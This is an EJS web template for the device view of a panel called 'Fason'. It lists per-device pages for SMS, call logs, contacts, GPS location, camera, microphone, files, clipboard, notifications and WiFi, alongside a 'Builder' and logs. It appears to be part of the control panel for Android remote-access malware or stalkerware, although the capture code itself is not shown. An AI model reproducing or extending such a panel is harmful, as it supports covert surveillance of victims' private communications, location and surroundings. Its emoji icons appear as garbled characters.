<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fason - <%= id %></title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
</head>
<body>
    <nav class="navbar">
        <a href="/" class="brand"><span class="fs-icon-sm">FS</span> Fason</a>
        <div class="nav-links">
            <a href="/">Dashboard</a>
            <a href="/builder">Builder</a>
            <a href="/logs">Logs</a>
            <a href="/logout">Logout</a>
        </div>
    </nav>

    <main class="container device-page">
        <aside class="sidebar">
            <div class="device-id"><%= id %></div>
            <nav class="menu">
                <a href="/device/<%= id %>/info" class="<%= page === 'info' ? 'active' : '' %>">ğŸ“± Info</a>
                <a href="/device/<%= id %>/sms" class="<%= page === 'sms' ? 'active' : '' %>">ğŸ’¬ SMS</a>
                <a href="/device/<%= id %>/calls" class="<%= page === 'calls' ? 'active' : '' %>">ğŸ“ Calls</a>
                <a href="/device/<%= id %>/contacts" class="<%= page === 'contacts' ? 'active' : '' %>">ğŸ‘¥ Contacts</a>
                <a href="/device/<%= id %>/gps" class="<%= page === 'gps' ? 'active' : '' %>">ğŸ“ Location</a>
                <a href="/device/<%= id %>/camera" class="<%= page === 'camera' ? 'active' : '' %>">ğŸ“· Camera</a>
                <a href="/device/<%= id %>/mic" class="<%= page === 'mic' ? 'active' : '' %>">ğŸ¤ Microphone</a>
                <a href="/device/<%= id %>/files" class="<%= page === 'files' ? 'active' : '' %>">ğŸ“ Files</a>
                <a href="/device/<%= id %>/apps" class="<%= page === 'apps' ? 'active' : '' %>">ğŸ“¦ Apps</a>
                <a href="/device/<%= id %>/clipboard" class="<%= page === 'clipboard' ? 'active' : '' %>">ğŸ“‹ Clipboard</a>
                <a href="/device/<%= id %>/notifications" class="<%= page === 'notifications' ? 'active' : '' %>">ğŸ”” Notifications</a>
                <a href="/device/<%= id %>/wifi" class="<%= page === 'wifi' ? 'active' : '' %>">ğŸ“¶ WiFi</a>
                <a href="/device/<%= id %>/permissions" class="<%= page === 'permissions' ? 'active' : '' %>">ğŸ” Permissions</a>
                <a href="/device/<%= id %>/downloads" class="<%= page === 'downloads' ? 'active' : '' %>">ğŸ’¾ Downloads</a>
            </nav>
        </aside>

        <section class="content">
            <% if (page === 'notfound') { %>
                <div class="card"><h2>Device not found</h2><p>This device doesn't exist.</p></div>
            
            <% } else if (page === 'info') { %>
                <%- include('pages/info', { data }) %>
            
            <% } else if (page === 'sms') { %>
                <%- include('pages/sms', { data, id }) %>
            
            <% } else if (page === 'calls') { %>
                <%- include('pages/calls', { data, id }) %>
            
            <% } else if (page === 'contacts') { %>
                <%- include('pages/contacts', { data, id }) %>
            
            <% } else if (page === 'gps') { %>
                <%- include('pages/gps', { data, id }) %>
            
            <% } else if (page === 'camera') { %>
                <%- include('pages/camera', { data, id }) %>
            
            <% } else if (page === 'mic') { %>
                <%- include('pages/mic', { data, id }) %>
            
            <% } else if (page === 'files') { %>
                <%- include('pages/files', { data, id }) %>
            
            <% } else if (page === 'apps') { %>
                <%- include('pages/apps', { data, id }) %>
            
            <% } else if (page === 'clipboard') { %>
                <%- include('pages/clipboard', { data, id }) %>
            
            <% } else if (page === 'notifications') { %>
                <%- include('pages/notifications', { data, id }) %>
            
            <% } else if (page === 'wifi') { %>
                <%- include('pages/wifi', { data, id }) %>
            
            <% } else if (page === 'permissions') { %>
                <%- include('pages/permissions', { data, id }) %>
            
            <% } else if (page === 'downloads') { %>
                <%- include('pages/downloads', { data, id }) %>
            
            <% } else { %>
                <div class="card"><h2>Page not found</h2></div>
            <% } %>
        </section>
    </main>

    <div id="toast" class="toast"></div>

    <script>const DEVICE_ID = '<%= id %>';</script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="/js/app.js"></script>
</body>
</html>
